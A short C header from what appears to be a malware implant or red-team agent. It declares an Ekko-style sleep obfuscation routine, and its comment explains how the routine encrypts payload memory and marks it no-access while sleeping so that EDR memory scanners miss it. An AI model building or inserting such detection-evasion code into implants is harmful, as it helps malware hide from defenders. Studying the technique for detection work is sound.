#pragma once
#include "common.h"

/*
 * Ekko-style sleep obfuscation.
 * Instead of a plain Sleep() (which leaves payload in cleartext in memory
 * for EDR memory scanners to find), this:
 *   1. Encrypts the payload's memory pages
 *   2. Sets them to PAGE_NOACCESS
 *   3. Sleeps using a timer (NtWaitForSingleObject on a timer queue)
 *   4. Wakes up, restores PAGE_EXECUTE_READ, decrypts
 *
 * The EDR memory scanner sees only encrypted PAGE_NOACCESS pages.
 */

/* Initialize sleep obfuscation for a memory region */
BOOL SleepObfuscateInit(PVOID base_addr, SIZE_T region_size);

/* Obfuscated sleep — encrypts, sleeps, decrypts */
void ObfuscatedSleep(DWORD milliseconds);
